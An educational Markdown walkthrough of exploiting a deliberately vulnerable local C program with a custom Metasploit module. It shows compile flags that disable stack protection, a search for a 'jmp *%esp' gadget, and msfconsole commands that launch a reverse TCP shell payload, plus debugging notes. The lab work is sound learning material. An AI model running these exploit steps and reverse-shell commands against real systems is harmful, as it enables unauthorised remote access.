# A Simple Buffer Overrun Example

In this short explanation, I will detail how to create an attack for a "local"
buffer overrun.  This example requires a meterpreter session to already be
active, so it's not at all realistic.  It is, however, instructive in terms
of creating metasploit modules.

## Setup

1) Setup local environment using direction [here](./running_local_images.md)

2) Use `msfvenom` to download a meterpreter and fire it up, creating a "session"

3) Copy the custom metasploit module found [here](./buffer_overrun_custom_exploit.rb)
to a location where msfconsole can find it.

```
cp buffer_overrun_custom_exploit.rb /usr/share/metasploit-framework/modules/exploits/custom/buffer_overrun_custom_exploit.rb
```

- Compile the silly little buffer overrun and find the address of the `jmp *%esp`
instruction.

```
gcc -static -g -m32 -std=c99 -Wall -fno-stack-protector -z execstack -o buffer_overrun buffer_overrun.c
objdump -D buffer_overrun &> buffer_overrun.dump
grep "*%esp" buffer_overrrun.dump
```

## Triggering the exploit

We will use the `jmp *%esp` instruction as the simplest type of ROP gadget.
It will trampoline the control flow to where the overrun occurred by, allowing
us to execute the injected payload.  Therefore, we will make the `jmp *%esp` our
return target.  To do this, modify the `buffer_overrun_custom_exploit.rb`
module's x86 `Ret` address to be the address we found above.  At this point,
you should now, with 100% accuracy, be able to use the first session, to create
a second session on the target machine.

```
msfconsole
use exploit/custom/buffer_overrun_custom_exploit
set PAYLOAD linux/x86/shell/reverse_tcp
set SESSION 1
set LHOST 172.17.0.2
set RHOST 172.17.0.2
set LPORT 8889
exploit
```
This is all a bit silly, I know.  But having a metasploit module operate on a
local program allows you to easily debug it, step through it, and understand
what's going on.

For example, you can now look in your `/tmp` directory for the payload file that
metasploit created and used.  With it, you can fire up a gdb session and step
through, looking at what happens.

```
gdb -tui --args ./buffer_overrun /tmp/RAND.txt
```

## Notes

1) I initially struggled with this simple example because my computer has ASLR
turned on, meaning that the stack was put in different places.  That's why I
switched to the extra step of using the ROP gadget.

2) It seems that the values of certain registers going into the payload are
important.  For example, I noticed that the meterpreter payload sometimes
overwrites itself. This occurs after the initial connection is made between the
target and the host and the payload attempts to download the full meterpreter
shell.  This happens because $ecx is set to an address right above the read
system call.

As I said, I noticed this before I started using the ROP gadget, so maybe it
was't working b/c I was trying to debug it with GDB, rather than just letting
metasploit do it's thing.  It is, however, something to be aware of if I start
running into similar problems.
